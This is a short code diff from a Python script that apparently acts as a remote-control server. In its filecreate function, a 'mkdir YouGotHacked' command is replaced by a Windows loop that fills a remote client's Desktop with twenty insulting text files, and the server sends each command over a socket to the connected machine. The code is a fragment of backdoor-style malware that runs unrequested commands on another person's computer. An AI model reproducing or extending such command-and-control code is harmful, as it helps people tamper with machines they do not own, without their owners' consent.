@@ -126,7 +126,7 @@ def shutdown():
         
 def filecreate():
     while True:
-        command = 'mkdir YouGotHacked'
+        command = 'cd Desktop && FOR /L %A IN (1 1 20) DO (echo. > “You suck eggs %A.txt”)'
         command = command.encode()
         currConn.send(command)
         print('Command sent to client: ', command)
